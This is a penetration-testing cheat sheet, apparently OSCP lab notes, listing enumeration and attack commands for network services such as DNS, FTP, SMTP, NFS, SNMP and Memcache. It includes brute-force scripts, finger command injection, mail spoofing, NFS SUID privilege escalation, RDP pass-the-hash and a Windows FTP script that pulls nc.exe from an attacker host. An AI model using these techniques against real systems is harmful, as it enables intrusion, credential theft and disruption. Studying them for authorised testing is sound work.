- [Service Name and Transport Protocol Port Number Registry](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml)

## Template 
```
## Name - port/tcp_or_udp

**Quick Reference**
**Tools**
**Hardening**
**References**
```

## Citrix - 1494/tcp 

**Quick Reference**

- Enumeration:
    ```bash 
    ./citrix-pa-scan {IP_address/file | - | random} [timeout]
    citrix-pa-proxy.pl IP_to_proxy_to [Local_IP]
    ```

## DHCP 

**Quick Reference**

- Get new IP address from DHCP:
  - Send `DHCPDISCOVER`
  - Receive `DHCPOFFER`
    ```
    dhclient
    ```

## DNS - 53/tcp

**Quick Reference**

- DNS on TCP
  - Check for zone transfers
  - Maybe DNS Sec enabled

- Configuration files
    ```
    host.conf
    resolv.conf
    named.conf
    ```
- Order of name resolution: `/etc/nsswitch.conf`
- DNS sever Information: `/etc/resolv.conf`
- Forward Lookup
  - whois
    ```bash
    whois example.com
    whois 50.7.67.186 (reverse)
    ```
- Reverse Lookup
  - write the IP-address in reverse order (for e.g. 192.168.1.1 will be 1.1.168.192)
  - append “.in-addr.arpa.” to it.
    ```bash
    dig 1.1.168.192.in-addr.arpa. PTR
    ```
    ```bash
    for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -­‐v "not found"
    ```
  - <https://stackoverflow.com/questions/23981098/how-forward-and-reverse-dns-works>

- Zone Transfers
  - Copying of the zone file from a master DNS server to a slave server
    ```bash
    host -t axfr domain.name dns-server
    ```
  - Root zone: `dig axfr @dns-server`
  - Domain name:
    - `dig axfr @dns-server domain.name`
    - `host -l example.com ns1.example.com`
    - `dnsrecon -d $ip -t axfr`
    - `nmap $ip --script=dns-zone-transfer -p 53`
  - Simple Zone Transfer Script:
    ```bash
    #/bin/bash
    # Simple Zone Transfer Bash Script
    # $1 is the first argument given after the bash script
    # Check if argument was given, if not, print usage
    if [ -­‐z "$1" ]; then
    echo "[*] Simple Zone transfer script"
    echo "[*] Usage : $0 <domain name> "
    exit 0
    fi

    # if argument was given, identify the DNS servers for the domain
    for server in $(host -­‐t ns $1 |cut -­‐d" " -­‐f4);do
    # For each of these servers, attempt a zone transfer
    host -­l $1 $server |grep "has address"
    done
    ```
- Bruteforcing
    ```
    fierce -dns site.com
    fierce -dns site.com -dnserver ns1.site.com

    dnsenum site.com –dnsserver ns1.site.com
    dnsenum site.com -f /root/hostlist.txt
    ```
- Subdomain bruteforcing
    ```bash
    for ip in $(cat list.txt); do host $ip.$website; done
    ```
    ```bash
    for domain in $(cat /usr/share/wordlists/dnscan/subdomains-100.txt);
    do host $domain.mydomain.com;sleep 2;done | grep has | sort -u
    ```
- Reverse dns lookup bruteforcing
    ```bash 
    for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found"
    ```
- DNS Recon Workflow (WIP)
  - 1) Get the host's addresse (A record).
  - 2) Get the namservers (threaded).
  - 3) Get the MX record (threaded).
  - 4) Perform axfr queries on nameservers and get BIND VERSION (threaded).
  - 5) Get extra names and subdomains via google scraping (google query = "allinurl: -www site:domain").
  - 6) Brute force subdomains from file
  - 7) Calculate C class domain network ranges and perform whois queries on them (threaded).
  - 8) Perform reverse lookups on netranges (C class or/and whois netranges) (threaded).
  - 9) Write to domain_ips.txt file ip-blocks.


**Tools**

- Dnsrecon
    ```bash
    dnsrecon -r 127.0.0.0/24 -n 10.10.10.29
    dnsrecon -r 127.0.1.0/24 -n 10.10.10.29
    dnsrecon -r 10.10.10.0/24 -n 10.10.10.29

    dnsrecon -d thinc.local -n 10.11.1.220 -t axfr -r 10.11.1.0/24
    dnsrecon -d site.com
    ```
- host
    ```bash
    host -t ns example.com
    host -t mx example.com

    host www.example.com -> results in IP address
    host nonexistent.example.com -> results in not found error

    host -l site.com ns2.site.com
    ```
    ```bash
    host -l friendzone.red 10.10.10.123| grep 'has address'|awk '{print $1}'
    ```
- nslookup
    ```bash
    nslookup <ip>

    nslookup site.com
    nslookup -query=mx site.com
    nslookup -query=ns site.com
    nslookup -query=any site.com
    ```
    ```bash
    > set type=a
    > google.com

    > server ns1.google.com
    > google.com
    ```
- dig
    ```bash
    # Usage:  dig [@global-server] [domain] [q-type] [q-class] {q-opt}
    #            {global-d-opt} host [@local-server] {local-d-opt}
    #            [ host [@local-server] {local-d-opt} [...]]

    dig google.com
    dig google.com mx
    dig @ns1.google.com google.com

    dig site.com
    dig site.com A
    dig +nocmd shite.com MX +noall +answer
    dig +nocmd site.com NS +noall +answer
    dig +nocmd site.com A +noall +answer
    dig site.com +nocmd AXFR +noall +answer @dns_server.com Zone Transfer
    ```
- fierce: <https://github.com/davidpepper/fierce-domain-scanner>
  - scanner that helps locate non-contiguous IP space and hostnames against specified domains.
  - pre-cursor to nmap, unicornscan, nessus, nikto, etc, since all of those require that you already know what IP space you are looking for
  - General checks: `fierce -dns example.com`
  - Wordlist attack: `fierce -dns example.com -wordlist hosts.list`
- recon-ng
    ```
    use recon/contacts/gather/http/api/whois_pocs
    set DOMAIN example.com
    run

    use recon/hosts/enum/http/web/xssed
    use recon/hosts/gather/http/web/google_site
    use recon/hosts/gather/http/web/ip_neighbor
    ```
- dnsenum
    ```
    dnsenum $ip
    ```
- dnsrecon
    ```
    dnsrecon
    dnsrecon ‐d example.com ‐t axfr

    dnsenum
    dnsenum example.com
    ```
- subbrute
  - Recursively crawls enumerated DNS records
  - Uses open resolvers as a kind of proxy to circumvent DNS rate-limiting
- knock
  - Wordlist based subdomain bruteforcing
  - Virustotal search
- Sublist3r
  - Subdomains with Google, Yahoo, Bing, Baidu, Ask, Netcraft, Virustotal, ThreatCrowd, DNSdumpster, and ReverseDNS
  - Can do "subbrute" scans internally
  - Can do port scans internally
- Online Services
  - <https://dnsdumpster.com/>

**Hardening**
**References**

- Payload Delivery Over DNS: <https://github.com/no0be/DNSlivery>
- DNS Rebind Toolkit <https://github.com/Kinimiwar/dns-rebind-toolkit>
- Global DNS Hijacking Campaign: DNS Record Manipulation at Scale: <https://eforensicsmag.com/global-dns-hijacking-campaign-dns-record-manipulation-at-scale-by-muks-hirani-sarah-jones-ben-read/>

## ElasticSearch - 9200/tcp

**Quick Reference**

**Interesting APIs**

Description                         | URL
:---------------------------------- | :--------------------------------------------------------------
Config information, OS, JVM version | `curl -XGET http://<ip>:9200/_nodes?pretty=true`
Shutdown                            | `curl -XPOST http://<ip>:9200/_cluster/nodes/_master/_shutdown`
Dump data                           | `curl "http://<ip>:9200/_search?size=10000&pretty=true"`
Snapshots                           | `_snapshot`

**Hardening**

- `elasticsearch.yml` - to prevent dynamic scripting:
    ```
    script.disable_dynamic: true
    ```
- <https://medium.com/@bromiley/exploiting-elasticsearch-c83825708ce1>

## Finger - 79/tcp

**Quick Reference**

- User enumeration
    ```bash
    finger @example.com
    finger 'a b c d e f g h' @example.com
    finger '1 2 3 4 5 6 7 8 9 0'@target_host
    finger admin@example.com
    finger user@example.com
    finger 0@example.com
    finger .@example.com
    finger **@example.com
    finger test@example.com
    ```
  - <http://pentestmonkey.net/tools/user-enumeration/finger-user-enum>
    ```
    finger-user-enum.pl -U seclists/Usernames/Names/names.txt -t <ip>
    ```
  - <https://github.com/s0wr0b1ndef/OSCP-note/blob/master/ENUMERATION/FINGER/finger_enum_user.sh>
- Finger Redirect
    ```bash
    finger @target_host1@target_host2
    ```
- Command execution
    ```bash
    finger "|/bin/id@example.com"
    finger "|/bin/ls -a /@example.com"
    ```
- Finger Bounce - Hop from one finger deamon to another. Request will get logged as if it arrived from a relay.
    ```bash
    finger@host.com@victim.com
    ```

**References**

- Giving the Finger to port 79 / Simple Finger Deamon Tutorial by Paris2K: <http://cd.textfiles.com/hmatrix/Tutorials/hTut_0269.html>
- <http://0daysecurity.com/penetration-testing/enumeration.html>

## FTP - 21/tcp

**Quick Reference**

- Scan for anonymous FTP: `nmap ‐v ‐p 21 -­‐script=ftp‐anon.nse 192.168.11.200-254`
- NSE: `nmap --script=*ftp* --script-args=unsafe=1 -p 20,21 <IP>`
- Anonymous login
    ```
    ftp ip_address
    Username: anonymous
    Password: any@email.com (if prompted)
    ```
- Clone: `wget -r --no-passive ftp://(USERNAME):(PASSWORD)@(TARGET IP ADDRESS)`
- Config files
    ```
    ftpusers
    ftp.conf
    proftpd.conf
    ```
- MITM
  - pasvagg.pl: <https://packetstormsecurity.com/0007-exploits/pasvagg.pl>
- Common FTP Commands
    ```
    GET ../../../boot.ini
    GET ../../../../../../boot.ini
    MGET ../../../boot.ini
    MGET ../../../../../../boot.ini
    ```

| Command | Description  |
| :------ | :----------- |
| ? |	Request help |
| ascii |	Set the mode of file transfer to ASCII (default / transmits 7bits per character) |
| binary | Set the mode of file transfer to binary (transmits all 8bits per byte and thus provides less chance of a transmission error and must be used to transmit files other than ASCII files)
| bye |	Exit the FTP environment (same as quit) |
| cd	| Change directory on the remote machine |
| close |	Rerminate a connection with another computer |
| close brubeck	| Closes the current FTP connection with brubeck, but still leaves you within the FTP environment. |
| delete |	Delete a file in the current remote directory (same as rm in UNIX)
| get |	Copy one file from the remote machine to the local machine |
| get ABC DEF |	Copies file ABC in the current remote directory to (or on top of) a file named DEF in your current local directory. |
| get ABC	| Copies file ABC in the current remote directory to (or on top of) a file with the same name, ABC, in your current local directory. |
| help	| Request a list of all available FTP command |
| lcd	| Change directory on your local machine (same as UNIX cd) |
| ls	| List the names of the files in the current remote directory |
| mkdir	| Make a new directory within the current remote directory |
| mget	| Copy multiple files from the remote machine to the local machine; you are prompted for a y/n answer before transferring each file |
| mget * | Copies all the files in the current remote directory to your current local directory, using the same filenames. Notice the use of the wild card character, *. |
| mput	| Copy multiple files from the local machine to the remote machine; you are prompted for a y/n answer before transferring each file |
| open	| Open a connection with another computer |
| open brubeck | Opens a new FTP connection with brubeck; you must enter a username and password for a brubeck account (unless it is to be an anonymous connection). |
| put	| Copy one file from the local machine to the remote machine |
| pwd	| Find out the pathname of the current directory on the remote machine |
| quit	| Exit the FTP environment (same as bye) |
| rmdir	| Remove a directory in the current remote directory |


- Bruteforcing 
    ```bash
    patator ftp_login host=10.11.1.220 port=21 user=COMBO0 password=COMBO01 0=/root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep=’Login or password incorrect’

    patator ftp_login host=/root/oscp/lab-net2019/ftp-open.txt port=21 user=COMBO0 password=COMBO01 0=/root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep=’Login or password incorrect’

    patator ftp_login host=FILE0 port=21 user=COMBO0 password=COMBO1 0=/root/oscp/lab-net2019/ftp-open.txt 1=/root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep=’Login or password incorrect’ -x ignore:fgrep=’cannot log in.’ -x ignore:fgrep=’Login incorrect’ -l ftp_spray
    ```
- TCP FTP Bounce Scan: `nmap –top-ports 1000 -vv -Pn -b anonymous:password@10.11.1.125:21 127.0.0.1`
- Script FTP 
    ```
    echo open (YOUR IP) 21 > C:\share\ftp.txt (Writeable Directory on target)
    echo USER pwnt >> C:\share\ftp.txt
    echo passwd >> C:\share\ftp.txt (Password for your FTP Server)
    echo bin >> C:\share\ftp.txt (Sets transfer up for binary files/bytes)
    echo GET nc.exe C:\share\nc.exe>> C:\share\ftp.txt
    echo bye >> C:\share\ftp.txt
    ```
    ```
    ftp -v -n -s:C:\share\ftp.txt
    ```

**Tools**
**Hardening**
**References**

## IMAP - 134/tcp 993/tcp

**Quick Reference**

- <https://tools.ietf.org/html/rfc3501>
- [Cheatsheet - https://busylog.net/telnet-imap-commands-note/](https://busylog.net/telnet-imap-commands-note/)
- [IMAP Capabilities & Commands Extensions](https://k9mail.github.io/documentation/development/imapExtensions.html)

- Connecting
  - Port 143 (plain / no SSL)
    ```
    telnet <IP> 143
    nc --crlf --verbose <IP> 143
    ```
  - Port 993 (SSL)
    ```
    openssl s_client -connect <IP>:993
    openssl s_client -connect <IP>:993 -crlf -quiet
    ```
- Command Format
  - Input: `<RandomStringID> command`
  - Response: `<RandomStringID> OK <ANSWER DETAIL>`
- Login
  - Login Method: `A1 login someuser@example.com My_P@ssword1`
  - When `AUTH=PLAIN` (SASL PLAIN Method)
    ```
    echo -en "\0someuser@example.com\0My_P@ssword1" | openssl base64
    ```
    ```
    a authenticate plain
    <send null separated encoded username, password>
    ```
  - When `AUTH=LOGIN` (SASL AUTH LOGIN)
    ```
    echo -en "someuser@example.com" | openssl base64
    echo -en "My_P@ssword1" | base64
    ```
    ```
    a AUTHENTICATE LOGIN
    <send encoded username>
    <send encoded password>
    ```
  - SASL PLAIN as an Admin User (Masquerade another user)
    ```
    authcidNULauthzidNULpassword
    ```
    ```
    echo -en "someuser@example.com\0admin\0admin1234" | openssl base64
    ```
    ```
    a authenticate plain
    <send encoded authcidNULauthzidNULpassword>
    ```
- Capability: `a capability`
- Retrieving Emails and Modifying the Inbox
  - Namespaces: `n namespace`
  - Examine Inbox: `ex1 EXAMINE INBOX`
  - List of folders
    ```
    LIST "<mailbox path>" "<search argument>"
    L1 list "INBOX/" "*"
    ```
  - `<mailbox path>`
    - if empty list shows all content from root
  - `<search argument>`
    - case-sensitive mailbox name with possible wildcards
    - `-` is a wildcard, and matches zero or more characters at this position.
    - `%` is similar to `*` but it does not match a hierarchy delimiter
- Fetch Messages
    ```
    f1 FETCH 1 BODY[]
    f2 fetch 2 RFC822
    f3 fetch 1:4 (BODY[HEADER.FIELDS (Subject)])
    ```
- Unseen
    ```
    s search UNSEEN
    ```
- Delete
    ```
    d store 2 +FLAGS (\Deleted)
    e expunge
    ```
- Example Session
    ```
    1\. telnet brainfuck.htb 143
    2\. a1 LOGIN orestis kHGuERB29DNiNE
    3\. a2 LIST "" "*"
    4\. a3 EXAMINE INBOX
    5\. a4 FETCH 1 BODY[]
    6\. a5 FETCH 2 BODY[]
    ```

**Tools**
**Hardening**
**References**

## IRC - 8067/tcp

**Quick Reference**

- Version / Connect
    ```bash
    irssi -c 10.10.10.117 --port 8067
    ```

## LDAP - 389/tcp

**Quick Reference**

- Configuration files
    ```
    containers.ldif
    ldap.cfg
    ldap.conf
    ldap.xml
    ldap-config.xml
    ldap-realm.xml
    slapd.conf
    ```
- Brute-forcing: `nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=schema,dc=targetbox,dc=target"' (TARGET IP ADDRESS) -vv`
- Dump:
  - `ldapdomaindump -u example\example 10.10.10.10`
  - `ldapsearch -LLL -x -H ldap://<domain> -b "" -s base "(objectclass=*)"`
  - `ldapsearch -LLL -x -H ldap://<domain> -b "" -s base "CN=example,DC=LOCAL"`
  - `ldapsearch -h EGOTISTICAL-BANK.LOCAL -p 389 -x -b "DC=EGOTISTICAL-BANK,DC=LOCAL"`
  - <http://jrwren.wrenfam.com/blog/2006/11/17/querying-active-directory-with-unix-ldap-tools/index.html>

**Tools**

- Softerra LDAP Administrator
- Jxplorer
- active directory domain services management pack for system center
- LDAP Admin Tool
- LDAP Administrator tool

**Hardening**
**References**

## Memcache

**Quick Reference**

- Connecting: `telnet localhost 11211`
- Information gathering
  - `nmap -p 11211 --script memcached-info`
  - `memcstat --servers=127.0.0.1`
- Read value
    ```bash
    memccat --servers=192.64.38.3 --username=user --password=pass flag
    ```
    ```bash
    $ nc localhost 112111

    get password
    VALUE password 0 6
    3dw4rd
    END
    ```
- Key information and dump values
    ```bash
    > version

    > stats items
    STAT items:3:number 1
    STAT items:3:age 498
    STAT items:22:number 1
    STAT items:22:age 498
    END

    > stats cachedump <stab-id> <limit>
    > stats cachedump 3 100
    ITEM views.decorators.cache.cache_header..cc7d9 [6 b; 1256056128 s]
    END
    ```
- Increment decrement
    ```
    > incr <id> 1
    > decr <id> 1
    ```
- Set new entry
    ```
    > set phone 0 60 9
    > 123456789
    ```
- Modify value
    ```
    > replace <key> 0 0 2
    > <new-value>
    ```
    ```
    > prepend address 0 0 6
    > house
    ```
    ```
    append address 0 0 6
    ,73301
    ```
- Delete
    ```
    > delete old_address
    ```
    ```bash
    > flush_all 30
    # invalidate all keys after 30 s
    ```
- Dump all keys
    ```
    memcdump --verbose --debug --servers=127.0.0.1 | tee keys.lst
    ```
- Dump all key-values
    ```bash
    memcached-tool localhost:11211 dump | less
    ```
    ```bash
    while read -r key; do
        [ -f "$key" ] || echo "get $key" | nc localhost 11211 > "$key.dump";
    done < <(memcdump --server localhost)
    ```
    ```bash
    memcdump --servers=localhost | xargs -L1 -I% sh -c 'echo "get %" | nc localhost 11211'
    ```
- memcmd
    ```bash
    function memcmd() {
    exec {memcache}<>/dev/tcp/localhost/11211
    printf "%s\n%s\n" "$*" quit >&${memcache}
    cat <&${memcache}
    }
    ```
  - 1.4.31 and above
    ```
    memcmd lru_crawler metadump all
    ```
  - 1.4.30 and below
    ```
    memcmd stats items
    memcmd stats cachedump 1 0
    ```
    ```bash
    for id in $(memcmd stats items | grep -o ":[0-9]\+:" | tr -d : | sort -nu); do
        memcmd stats cachedump $id 0
    done
    ```

**Tools**

- Python Library: <https://github.com/abstatic/python-memcached-stats>
- Bruteforce
    ```python
    #!/usr/bin/python3
    import subprocess

    dictionary=open("/usr/share/wordlists/rockyou.txt")
    for pwd in dictionary:
        out=subprocess.getoutput('memcstat --servers=192.64.38.3 --username=student --password='+pwd)
        if len(out)>0:
            print(out)
            print("PASSWORD: "+pwd)
            break
    ```

**Hardening**
**References**

## Modbus - 502/tcp

**Quick Reference**
**Tools**

-  Map a SCADA MODBUS TCP based network: <https://packetstormsecurity.com/UNIX/scanners/modscan.py.txt>
  
**Hardening**
**References**

## NFS - 2049/tcp

**Quick Reference**

- Configuration files
    ```
    /etc/exports
    /etc/lib/nfs/xtab
    ```
- Enumeration
    ```bash
    nmap -sV --script=nfs-* 192.168.44.133
    nmap -sV --script=nfs-ls 192.168.44.133  //same result as rpcinfo
    nmap -sV --script=nfs-* 192.168.44.133
    ```
- Enumerate NFS shares: `showmount -e hostname/ip_address`
- Mount NFS shares:
    ```bash
    mount -t nfs ip_address:/directory_found_exported /local_mount_point
    mount -t nfs 192.168.1.72:/home/vulnix /tmp/mnt -nolock
    ```
- `/etc/exports` file contains configurations and permissions of which folders/file systems are exported to remote users
- Root squashing - Prevents having root access to remote root users connected to NFS volume. Remote root users are assigned a user "nfsnobody" when connected.
  - <https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/>
  - `no_root_squash` - Gives the remote user root access to the connected system
    - With limited user account: `cp /bin/bash /shared`
    - Then mount the share: `mount -t nfs server:/shared /mnt/` and run `chown root:root bash && chmod u+s bash`
    - Run the file with limited user account: `/shared/bash`
  
**Tools**

- NFS shell - <https://github.com/NetDirect/nfsshell>
  - Provides user level access to an NFS server, over UDP or TCP, supports source routing and "secure" (privileged port) mounts.
    ```bash
    nfsshell> host <ip>
    nfsshell> mount <name of the share>
    nfsshell> gid 1000
    nfsshell> uid 1000
    nfsshell> put example
    nfsshell> chmod 0777 example
    ```

**Hardening**
**References**

- <http://linuxadministrative.blogspot.com/2014/09/showmount-command-examples.html>
- Exploiting Network File System, (NFS), shares: <http://www.vulnerabilityassessment.co.uk/nfs.htm>

## NTP - 123/tcp

**Quick Reference**

- Configuration files
    ```
    ntp.conf
    ```

**Tools**

- ntptrace - Query to determine from where the NTP server updates its time and traces the chain of NTP servers from a source
- ntpdc - Query the ntp Deamon about its current state and to request changes in the state
    ```
    ntpdc -c monlist IP_ADDRESS
    ntpdc -c sysinfo IP_ADDRESS
    ```
- ntpq - Monitors NTP daemon ntpd operations and determine performance

**Hardening**

- NTPSec
- IPTables
- logging

**References**

## POP3 - 110/tcp

**Quick Reference**

- Login
    ```
    USER username
    PASS password
    ```

Other commands

| Command | Comment |
| :------ | :------ |
| USER | Your user name for this mail server |
| PASS | Your password. |
| QUIT | End your session. |
| STAT | Number and total size of all messages |
| LIST | Message# and size of message |
| RETR | message#	Retrieve selected message |
| DELE | message#	Delete selected message |
| NOOP | No-op. Keeps you connection open. |
| RSET | Reset the mailbox. Undelete deleted messages. |
| TOP 1 0 | Return headers only |
| TOP 1 10 | Return headers and first 10 lines of body |

**Tools**
**Hardening**
**References**

## PPTP-L2TP-VPN - 500/tcp 1723/tcp

**Quick Reference**
**Tools**
**Hardening**
**References**

- <http://0daysecurity.com/penetration-testing/enumeration.html>
- PSK Cracking using IKE Aggressive Mode: <http://www.ernw.de/download/pskattack.pdf>
- Penetration Testing IPsec VPNs: <https://www.symantec.com/connect/articles/penetration-testing-ipsec-vpns>
- Scanning and probing a VPN (ikescan): <https://www.radarhack.com/dir/papers/Scanning_ike_with_ikescan.pdf>

## RDP - 3389/tcp

**Quick Reference**

- PTH: `xfreerdp /u:testing /d:thinc /pth:31d6cfe0d16ae931b73c59d7e0c089c0 /v:192.168.1.23`

**Tools**

- List the RDP Connections History: <https://github.com/3gstudent/List-RDP-Connections-History>

**Hardening**
**References**

- RDP hijacking — how to hijack RDS and RemoteApp sessions transparently to move through an organisation: <https://doublepulsar.com/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6>

## rlogin - 513/tcp

**Quick Reference**

- Locating files
    ```
    find / -name .rhosts
    locate .rhosts
    ```
- Manual login: `rlogin hostname -l username`

**Tools**
**Hardening**
**References**

- <http://0daysecurity.com/penetration-testing/enumeration.html>


## SMTP - 25/tcp

**Quick Reference**

- Connect: `nc -‐nv 192.168.11.215 25`
- Configuration files
    ```
    sendmail.cf
    submit.cf
    ```
- User enumeration with: "VRFY", "EXPN" & "RCPT" commands:
    ```bash
    smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 10.11.1.22
    ```
    ```bash
    VRFY username (verifies if username exists - enumeration of accounts)
    EXPN username (verifies if username is valid - enumeration of accounts)
    ```
    ```bash
    VRFY existing_user
    Results in: 250

    VRFY nonexisting_user
    Results in: 550
    ```
    ```bash
    for user in $(cat users.txt); do echo VRFY $user | nc -nv -w <ip> 25 2>/dev/null | grep ^"250"; done
    ```
- Mail Spoofing: <http://0daysecurity.com/penetration-testing/enumeration.html>
    ```
    HELO anything MAIL FROM: spoofed_address RCPT TO:valid_mail_account DATA . QUIT
    ```
-  Mail Relay
    ```
    HELO anything

    Identical to/from - mail from: <nobody@domain> rcpt to: <nobody@domain>
    Unknown domain - mail from: <user@unknown_domain>
    Domain not present - mail from: <user@localhost>
    Domain not supplied - mail from: <user>
    Source address omission - mail from: <> rcpt to: <nobody@recipient_domain>

    Use IP address of target server - mail from: <user@IP_Address> rcpt to: <nobody@recipient_domain>
    Use double quotes - mail from: <user@domain> rcpt to: <"user@recipent-domain">

    User IP address of the target server - mail from: <user@domain> rcpt to: <nobody@recipient_domain@[IP Address]>

    Disparate formatting - mail from: <user@[IP Address]> rcpt to: <@domain:nobody@recipient-domain>

    Disparate formatting2 - mail from: <user@[IP Address]> rcpt to: <recipient_domain!nobody@[IP Address]>
    ```
    > http://0daysecurity.com/penetration-testing/enumeration.html

- Sending a mail
    ```
    HELO my.server.com
    MAIL FROM:
    RCPT TO:
    DATA
    From: Danny Dolittle
    To: Sarah Smith
    Subject: Email sample
    Mime-Version: 1.0
    Content-Type: text/plain; charset=us-ascii

    This is a test email for you to read.
    .
    QUIT
    ```
- Brute-forcing: `hydra (TARGET IP ADDRESS) smtp -l (USERNAME) -P /path/to/wordlist.txt -V -s (TARGET PORT)`

Other commands

| Command | Comment |
| :------ | :------ |
| ATRN |	Authenticated TURN |
| AUTH | 	Authentication |
| BDAT | 	Binary data |
| BURL | 	Remote content |
| DATA | 	The actual email message to be sent. This command is terminated with a line that contains only a |
| EHLO | 	Extended HELO |
| ETRN | 	Extended turn |
| EXPN | 	Expand |
| HELO | 	Identify yourself to the SMTP server. |
| HELP | 	Show available commands |
| MAIL | 	Send mail from email account, MAIL FROM: me@mydomain.com |
| NOOP | 	No-op. Keeps you connection open. |
| ONEX | 	One message transaction only |
| QUIT | 	End session |
| RCPT | 	Send email to recipient,  RCPT TO: you@yourdomain.com |
| RSET | 	Reset |
| SAML | 	Send and mail |
| SEND | 	Send |
| SOML | 	Send or mail |
| STARTTLS | |
| SUBMITTER | SMTP responsible submitter |
| TURN | 	Turn |
| VERB | 	Verbose |
| VRFY | 	Verify |

**Tools**

- smtp_enum: `auxiliary/scanner/smtp/smtp_enum`
- smtp-enum-users.nse: `nmap –script smtp-enum-users.nse 172.16.212.133`

**Hardening**
**References**

## SNMP - 161/udp

**Quick Reference**

- Baed on UDP - Can be suspectable for IP spoofing and replay
- 1,2,2c versions are plain text
- Week auth and default community strings (public, default)
- Devices often support configuration file read and write through private SNMP community string access. Hence having access to private string means router configuration can be altered.
- Configuration Files
    ```
    snmp.conf
    snmpd.conf
    snmp-config.xml
    ```
- SNMP - Management Information Base (MBI)
  - Tree database related to network management.
  - <http://publib.boulder.ibm.com/infocenter/pseries/v5r3/index.jsp?topic=/com.ibm.aix.progcomm/doc/progcomc/mib.htm>
  - commuity strings - public / private / manager / ...
- Scanning
    ```
    nmap -sU -p 161 --open <ip>
    nmap -sU -p 161 --script=*snmp* 192.168.1.200
    xprobe2 -v -p udp:161:open 192.168.1.200
    ```
    ```
    auxiliary/scanner/snmp/snmp_login
    auxiliary/scanner/snmp/snmp_enum
    ```
- Default community strings
    ```
    public
    private
    cisco
        cable-docsis
        ILMI
    ```
- Important Properties:
  - Windows NT
    ```
    .1.3.6.1.2.1.1.5 Hostnames
    .1.3.6.1.2.1.4.34.1.5.2.16 IPv6 Address

    .1.3.6.1.4.1.77.1.4.2 Domain Name
    .1.3.6.1.4.1.77.1.2.25 Usernames
    .1.3.6.1.4.1.77.1.2.3.1.1 Running Services
    .1.3.6.1.4.1.77.1.2.27 Share Information
    ```
- Commands:
    ```
    snmp-check 192.168.1.2 -c public
    snmpget -v 1 -c public IP
    snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP
    ```

**Tools**

- SNMPWalk
    ```
    sudo apt install --no-upgrade snmp-mibs-downloader
    ```
    ```
    snmpwalk -Os -c public -v 1 <ip>
    ```
    ```
    snmpwalk -c public (TARGET IP ADDRESS) -v1 -On
    snmpwalk -c public -v2c (TARGET IP ADDRESS)
    v3 doesnt have easily guessable / default community string
    ```
  - Probe MBI
    ```
    snmpwalk -c public -v 1 <ip> 1.3.6.1.2.1.25.4.2.1.2
    • 1.3.6.1.2.1.25.1.6.0 System Processes
    • 1.3.6.1.2.1.25.4.2.1.2 Running Programs
    • 1.3.6.1.2.1.25.4.2.1.4 Processes Path
    • 1.3.6.1.2.1.25.2.3.1.4 Storage Units
    • 1.3.6.1.2.1.25.6.3.1.2 Software Name
    • 1.3.6.1.4.1.77.1.2.25 User Accounts
    • 1.3.6.1.2.1.6.13.1.3	 TCP Local Ports
    ```
- onesixtyone
  - Scan one community string for multiple IPs
    ```
    onesixtyone -c community.txt -i ips.txt
    onesixtyone -c /pwnt/passwords/wordlists/SecLists/Discovery/SNMP/snmp.txt (TARGET IP ADDRESS)
    ```
- snmpenum: `perl snmpenum.pl 192.168.38.200 public windows.txt`
- OpUtils
- SolarWinds
- SNScan
- SNMP Scanner
- NS Auditor
- snmpcheck

**Hardening**
**References**

## SquidProxy - 3128/tcp

**Quick Reference**

- Usable in pivoting:
  - `auxiliary/scanner/http/squid_pivot_scanning`
  - `nikto -h http://(TARGET IP ADDRESS) -useproxy http://(TARGET IP ADDRESS):3128`

**Tools**
**Hardening**
**References**

## SSH - 22/tcp 

**Quick Reference**

- User Enumeration: `searchsploit -m 40136` `auxiliary/scanner/ssh/ssh_enumusers`
- Configuration Files
    ```
    ssh_config
    sshd_config
    authorized_keys
    ssh_known_hosts
    .shosts
    ```
- PPK (Putty) to SSH/RSA key-file
    ```
    puttygen my_private_key.ppk -O private-openssh -o keyfile
    chmood 600 keyfile
    ssh -l (USERNAME) (TARGET IP ADDRESS) -i keyfile
    ```
- RSA key cracking 
    ```
    ssh2john id_rsa > id_rsa.john
    john --wordlist=/path/to/rockyou.txt id_rsa.john
    ```

**Tools**

- scanssh
    ```
    scanssh -p -r -e excludes random(no.)/Network_ID/Subnet_Mask
    ```
- HASSH - a Profiling Method for SSH Clients and Servers: <https://github.com/salesforce/hassh/>
  - "HASSH" is a network fingerprinting standard which can be used to identify specific Client and Server SSH implementations. The fingerprints can be easily stored, searched and shared in the form of an MD5 fingerprint.

**Hardening**

- SSH Auditor: <https://github.com/ncsa/ssh-auditor>
  - Re-check all known hosts as new credentials are added. It will only check the new credentials.
  - Queue a full credential scan on any new host discovered.
  - Queue a full credential scan on any known host whose ssh version or key fingerprint changes.
  - Attempt command execution as well as attempt to tunnel a TCP connection.
  - Re-check each credential using a per credential scan_interval - default 14 days.

**References**

## Telnet - 23/tcp

**Quick Reference**

- Configuration files
    ```
    /etc/inetd.conf
    /etc/xinetd.d/telnet
    /etc/xinetd.d/stelnet
    ```

**Tools**

- Telnet Honeypot - <https://github.com/stamparm/hontel>
- OS fingerprinting with telnet: <https://securiteam.com/tools/6J00L0K06U/>

**Hardening**
**References**

## TFTP - 69/tcp

**Quick Reference**

- Enumeration
    ```bash
    tftp ip_address PUT local_file
    tftp ip_address GET conf.txt (or other files)

    Solarwinds TFTP server
    tftp – i <IP> GET /etc/passwd (old Solaris)
    ```
- Connect
    ```
    TFTP
    tftp> connect
    (to) <ip>
    tftp> verbose
    ```
- Transfer file
    ```
    tftp> binary
    tftp> put example.exe /windows/system32/example.exe
    ```
- Receive file
    ```
    tftp> binary
    tftp> get /windows/system32/example.exe
    ```

**Tools**
**Hardening**
**References**

## VNC - 5900/tcp

**Quick Reference**

- Configuration files
    ```
    .vnc
    /etc/vnc/config
    $HOME/.vnc/config
    /etc/sysconfig/vncservers
    /etc/vnc.conf
    ```
- Registry locations
    ```
    \HKEY_CURRENT_USER\Software\ORL\WinVNC3
    \HKEY_USERS\.DEFAULT\Software\ORL\WinVNC3
    ```
    ```
